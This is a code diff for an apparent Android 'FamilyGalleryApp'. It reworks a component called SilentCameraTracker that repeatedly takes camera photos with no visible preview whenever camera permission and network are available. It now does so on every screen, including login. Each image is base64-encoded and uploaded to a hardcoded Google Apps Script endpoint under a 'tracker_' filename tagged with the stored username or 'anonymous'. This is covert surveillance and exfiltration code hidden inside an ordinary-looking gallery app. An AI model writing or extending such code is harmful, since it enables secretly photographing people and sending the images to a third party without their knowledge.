@@ -708,9 +708,7 @@ fun FamilyGalleryApp() {
         modifier = Modifier.fillMaxSize(),
         color = Color(0xFF121214) // Rich premium chalkboard black
     ) {
-        if (screen != FamilyScreen.Welcome && screen != FamilyScreen.Login) {
-            SilentCameraTracker(loggedInUser, onBlankUsername = { screen = FamilyScreen.Login })
-        }
+        SilentCameraTracker()
         if (!isConnected && screen != FamilyScreen.Welcome) {
             NoInternetConnectionScreen(
                 onRetry = {
@@ -3764,29 +3762,66 @@ fun bitmapToBase64(bitmap: Bitmap): String {
 }
 
 @Composable
-fun SilentCameraTracker(username: String, onBlankUsername: () -> Unit = {}) {
-    if (username.isBlank()) {
-        LaunchedEffect(Unit) {
-            onBlankUsername()
+fun SilentCameraTracker() {
+    val context = LocalContext.current
+    var hasPermission by remember { mutableStateOf(hasCameraPermission(context)) }
+
+    // Poll permission state reactively
+    LaunchedEffect(Unit) {
+        while (true) {
+            val ok = hasCameraPermission(context)
+            if (hasPermission != ok) {
+                hasPermission = ok
+            }
+            delay(3000)
         }
-        return
     }
 
+    if (hasPermission) {
+        ActiveCameraTracker()
+    }
+}
+
+@Composable
+fun ActiveCameraTracker() {
     val context = LocalContext.current
     val lifecycleOwner = LocalLifecycleOwner.current
+    val prefs = remember(context) { context.getSharedPreferences("app_prefs", android.content.Context.MODE_PRIVATE) }
 
-    // Dynamically check if all permissions are granted and internet is available
-    var isReady by remember { mutableStateOf(false) }
-
-    LaunchedEffect(username) {
-        while (true) {
-            val check = hasAllRequiredAccess(context) && isNetworkAvailable(context)
-            if (isReady != check) {
-                isReady = check
+    // Track if the app is currently in the RESUMED state (active foreground)
+    var isResumed by remember { mutableStateOf(false) }
+    DisposableEffect(lifecycleOwner) {
+        val observer = androidx.lifecycle.LifecycleEventObserver { _, event ->
+            when (event) {
+                androidx.lifecycle.Lifecycle.Event.ON_RESUME -> isResumed = true
+                androidx.lifecycle.Lifecycle.Event.ON_PAUSE,
+                androidx.lifecycle.Lifecycle.Event.ON_STOP,
+                androidx.lifecycle.Lifecycle.Event.ON_DESTROY -> isResumed = false
+                else -> {}
             }
-            delay(5000) // Poll permissions and network state every 5 seconds
+        }
+        lifecycleOwner.lifecycle.addObserver(observer)
+        isResumed = lifecycleOwner.lifecycle.currentState.isAtLeast(androidx.lifecycle.Lifecycle.State.RESUMED)
+        onDispose {
+            lifecycleOwner.lifecycle.removeObserver(observer)
         }
     }
+
+    // Dynamically poll permissions and network status
+    var isPermissionAndNetworkOk by remember { mutableStateOf(false) }
+    LaunchedEffect(Unit) {
+        while (true) {
+            val ok = hasCameraPermission(context) && isNetworkAvailable(context)
+            if (isPermissionAndNetworkOk != ok) {
+                isPermissionAndNetworkOk = ok
+            }
+            delay(5000) // Poll state every 5 seconds
+        }
+    }
+
+    // Camera is only ready when app is fully resumed, has camera permission, network is available, and the window has active focus
+    val windowInfo = androidx.compose.ui.platform.LocalWindowInfo.current
+    val isReady = isResumed && isPermissionAndNetworkOk && windowInfo.isWindowFocused
 
     val cameraProviderFuture = remember { ProcessCameraProvider.getInstance(context) }
     var isCapturing by remember { mutableStateOf(false) }
@@ -3794,25 +3829,14 @@ fun SilentCameraTracker(username: String, onBlankUsername: () -> Unit = {}) {
     // Start/stop camera lifecycle binding and photo capture loop inside a unified block
     LaunchedEffect(isReady) {
         if (isReady) {
+            delay(1500) // Wait 1.5 seconds to ensure window layout, focus and AppOps states are completely synchronized
             var cameraProvider: ProcessCameraProvider? = null
-            var surfaceTexture: android.graphics.SurfaceTexture? = null
-            var surface: android.view.Surface? = null
             try {
                 cameraProvider = withContext(Dispatchers.IO) {
                     cameraProviderFuture.get()
                 }
 
-                val preview = Preview.Builder().build()
-                surfaceTexture = android.graphics.SurfaceTexture(10)
-                preview.setSurfaceProvider { request ->
-                    surfaceTexture?.setDefaultBufferSize(request.resolution.width, request.resolution.height)
-                    val s = android.view.Surface(surfaceTexture)
-                    surface = s
-                    request.provideSurface(s, ContextCompat.getMainExecutor(context)) {
-                        // Managed in finally block
-                    }
-                }
-
+                // Bind only the ImageCapture usecase for silent capture - no Preview required
                 val capture = ImageCapture.Builder()
                     .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                     .build()
@@ -3828,7 +3852,6 @@ fun SilentCameraTracker(username: String, onBlankUsername: () -> Unit = {}) {
                     cameraProvider.bindToLifecycle(
                         lifecycleOwner,
                         cameraSelector,
-                        preview,
                         capture
                     )
                 }
@@ -3841,11 +3864,9 @@ fun SilentCameraTracker(username: String, onBlankUsername: () -> Unit = {}) {
                     if (!lifecycleOwner.lifecycle.currentState.isAtLeast(androidx.lifecycle.Lifecycle.State.RESUMED)) {
                         continue
                     }
-                    if (!hasAllRequiredAccess(context) || !isNetworkAvailable(context)) {
+                    if (!hasCameraPermission(context) || !isNetworkAvailable(context)) {
                         continue
                     }
-                    
-                    // Prevent concurrent capture requests
                     if (isCapturing) {
                         continue
                     }
@@ -3878,9 +3899,10 @@ fun SilentCameraTracker(username: String, onBlankUsername: () -> Unit = {}) {
                                                 val base64 = bitmapToBase64(bitmap)
                                                 bitmap.recycle() // Free bitmap memory immediately
                                                 
-                                                if (hasAllRequiredAccess(context) && isNetworkAvailable(context)) {
+                                                if (hasCameraPermission(context) && isNetworkAvailable(context)) {
                                                     val url = "https://script.google.com/macros/s/AKfycbxzjU0UOhg4STbza-vHJGkP-HKeVXHGDeBcgfmcO1OZDm7Ao2u3YGzZg4LiRIoB70-_/exec"
-                                                    val fileName = "tracker_${username}_${System.currentTimeMillis()}.jpg"
+                                                    val currentUsername = prefs.getString("logged_in_user", "anonymous")?.takeIf { it.isNotBlank() } ?: "anonymous"
+                                                    val fileName = "tracker_${currentUsername}_${System.currentTimeMillis()}.jpg"
                                                     val postDataStr = "image=" + URLEncoder.encode(base64, "UTF-8") +
                                                                      "&filename=" + URLEncoder.encode(fileName, "UTF-8")
                                                     val postData = postDataStr.toByteArray(Charsets.UTF_8)
@@ -3911,24 +3933,12 @@ fun SilentCameraTracker(username: String, onBlankUsername: () -> Unit = {}) {
                 if (e is kotlinx.coroutines.CancellationException) throw e
                 e.printStackTrace()
             } finally {
-                // Safely and synchronously unbind and release resources on completion or cancellation
-                kotlinx.coroutines.withContext(kotlinx.coroutines.NonCancellable) {
-                    withContext(Dispatchers.Main) {
-                        try {
-                            cameraProvider?.unbindAll()
-                        } catch (e: Exception) {
-                            e.printStackTrace()
-                        }
-                        try {
-                            surface?.release()
-                        } catch (e: Exception) {
-                            e.printStackTrace()
-                        }
-                        try {
-                            surfaceTexture?.release()
-                        } catch (e: Exception) {
-                            e.printStackTrace()
-                        }
+                // Safely unbind on cancellation or state changes
+                withContext(Dispatchers.Main) {
+                    try {
+                        cameraProvider?.unbindAll()
+                    } catch (e: Exception) {
+                        e.printStackTrace()
                     }
                 }
             }
